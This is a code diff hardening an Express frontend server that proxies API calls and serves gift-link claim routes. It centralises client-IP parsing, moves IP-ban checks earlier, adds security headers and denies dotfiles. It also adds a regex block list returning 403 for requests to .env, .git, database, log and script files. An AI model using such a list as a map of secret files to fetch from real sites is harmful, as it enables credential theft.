@@ -1,3 +1,4 @@
+require('dotenv').config();
 const { attachGlobalLoggerGuard } = require('../autosecure/utils/logging/interceptLogger');
 attachGlobalLoggerGuard();
 
@@ -5,32 +6,65 @@ const express = require('express');
 const path = require('path');
 const http = require('http');
 const rateLimit = require('express-rate-limit');
-const config = require('../config.json');
+const config = require('../configLoader');
 
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('[ANTI-CRASH] Frontend Unhandled Rejection:', reason);
-});
-process.on('uncaughtException', (err, origin) => {
-    console.error(`[ANTI-CRASH] Frontend Uncaught Exception: ${err ? err.message : err}`, err ? err.stack : '');
-});
+const { setupGlobalErrorHandlers, registerServer } = require('../autosecure/utils/process/gracefulShutdown');
+setupGlobalErrorHandlers('FrontendServer');
+
+const { getClientIp, configureTrustProxy } = require('../autosecure/utils/security/clientIp');
+const { securityHeaders } = require('../autosecure/utils/security/apiAuth');
 
 const app = express();
-app.set('trust proxy', 1); // Trust Nginx/Cloudflare for rate-limit
+configureTrustProxy(app, 'edge');
+app.use(securityHeaders);
+app.disable('x-powered-by');
 const PORT = process.env.FRONTEND_PORT || process.env.PORT || 3667;
 const BACKEND_PORT = process.env.BACKEND_PORT || 5000;
 const FRONTEND_DIR = path.join(__dirname, '..', 'public');
+
+// Security Defense: Block attempts to access sensitive files (.env, .git, .json, .sqlite, .db, .log)
+app.use((req, res, next) => {
+    const url = req.url.toLowerCase();
+    if (/\.(env|git|json|sqlite|db|log|sh|bat)(\/|\?|$)/i.test(url) || url.includes('/.env') || url.includes('/.git')) {
+        return res.status(403).send('403 Forbidden');
+    }
+    next();
+});
 
 const staticLimiter = rateLimit({
     windowMs: 1 * 60 * 1000,
     max: 300,
     standardHeaders: true,
     legacyHeaders: false,
+    keyGenerator: (req) => getClientIp(req),
     message: 'Too many requests from this IP, please try again later.'
 });
 app.use(staticLimiter);
 
+const { queryParams } = require('../db/database');
+const { sendWebLog } = require('../autosecure/utils/webLogger');
+
+// IP Ban Middleware
+app.use(async (req, res, next) => {
+    try {
+        const clientIp = getClientIp(req);
+        if (clientIp) {
+            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
+            if (banned && banned.length > 0) {
+                if (req.url.startsWith('/api')) {
+                    return res.status(403).json({ success: false, error: 'Your IP has been blocked by security rules.' });
+                }
+                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
+            }
+        }
+    } catch (e) { }
+    next();
+});
+
 // Forward API requests from frontend to backendServer
 app.use('/api', (req, res) => {
+    const clientIp = getClientIp(req);
+
     const proxyReq = http.request({
         hostname: '127.0.0.1',
         port: BACKEND_PORT,
@@ -38,6 +72,7 @@ app.use('/api', (req, res) => {
         method: req.method,
         headers: {
             ...req.headers,
+            'x-forwarded-for': clientIp,
             'x-forwarded-host': req.headers.host || '',
             host: `127.0.0.1:${BACKEND_PORT}`
         }
@@ -54,24 +89,6 @@ app.use('/api', (req, res) => {
     req.pipe(proxyReq, { end: true });
 });
 
-const { sendWebLog } = require('../autosecure/utils/webLogger');
-const { queryParams } = require('../db/database');
-
-// IP Ban Middleware
-app.use(async (req, res, next) => {
-    try {
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim();
-        if (clientIp) {
-            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
-            if (banned && banned.length > 0) {
-                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
-            }
-        }
-    } catch (e) { }
-    next();
-});
-
 app.get('/config.js', (req, res) => {
     res.sendFile(path.join(FRONTEND_DIR, 'config.js'));
 });
@@ -81,9 +98,11 @@ app.get('/health', (req, res) => {
 });
 
 app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets'), {
+    dotfiles: 'deny',
     maxAge: '1h'
 }));
 app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms'), {
+    dotfiles: 'deny',
     maxAge: '1h'
 }));
 
@@ -97,8 +116,7 @@ setInterval(async () => {
 // Donut Gift Link Claim Routes
 app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
     const code = req.params.code;
-    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-    const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+    const clientIp = getClientIp(req);
     const host = req.headers.host || config.webDomain || 'donuttsmp.store';
     const EXPIRY_MS = 3 * 60 * 60 * 1000; // 3 hours
     const now = Date.now();
@@ -185,16 +203,19 @@ app.get('/terms/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 't
 app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_impressum.html')));
 app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));
 
-app.use(express.static(FRONTEND_DIR));
+app.use(express.static(FRONTEND_DIR, {
+    dotfiles: 'deny'
+}));
 
 function startFrontend() {
-    app.listen(PORT, () => {
+    const server = app.listen(PORT, () => {
         if (process.env.RUN_ALL_MODE === 'true') {
             console.log(`[FRONTEND] ✓ Cổng ${PORT} sẵn sàng (Website: http://localhost:${PORT})`);
             return;
         }
         console.log(`[FRONTEND] Listening on http://localhost:${PORT}`);
     });
+    registerServer(server);
 }
 
 if (require.main === module) {
